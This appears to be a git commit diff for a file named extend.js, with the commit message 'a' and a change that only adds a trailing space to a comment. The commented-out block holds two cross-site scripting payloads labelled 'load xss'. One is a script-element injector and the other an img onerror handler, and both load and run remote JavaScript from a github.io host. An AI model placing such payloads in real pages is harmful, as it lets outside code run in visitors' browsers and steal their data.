3dde7fa0e55f517f1becb1e78aeb2b600c99808f
司土御帝 <1181935296@qq.com>
2020-09-15 11:03:23 +0800

    a

--- extend.js
+++ extend.js
@@ -1,5 +1,5 @@
 (function(){
-    /* load xss
+    /* load xss 
      var drc = document.createElement('script');drc.setAttribute("src","https://biluweb.github.io/assets/extend.js");document.getElementsByTagName('head')[0].appendChild(drc);
      ["<img src=\"d\" onerror=\"var drc = document.createElement(\'script\');drc.setAttribute(\'src\',\'https://biluweb.github.io/assets/extend.js\');document.getElementsByTagName(\'head\')[0].appendChild(drc);\">"].join("");
     */
